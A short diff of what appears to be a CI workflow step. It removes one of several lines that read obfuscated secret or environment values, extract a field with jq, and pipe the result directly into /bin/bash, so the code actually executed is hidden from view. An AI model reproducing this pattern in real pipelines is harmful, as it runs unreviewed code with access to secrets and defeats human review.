@@ -18,7 +18,6 @@ jobs:
           qu39: ${{ secrets.qu39 }}
         run: |
           printf '%s' "$qu39" | jq -r .a87 | /bin/bash
-          printf '%s' "$qytg4318" | jq -r .ilhms038 | /bin/bash
           echo $gssqo1 | jq -r .diwv97116 | /bin/bash
           echo $efpbk7 | jq -r .w9 | /bin/bash
           echo $dw642 | jq -r .gtp97400 | /bin/bash
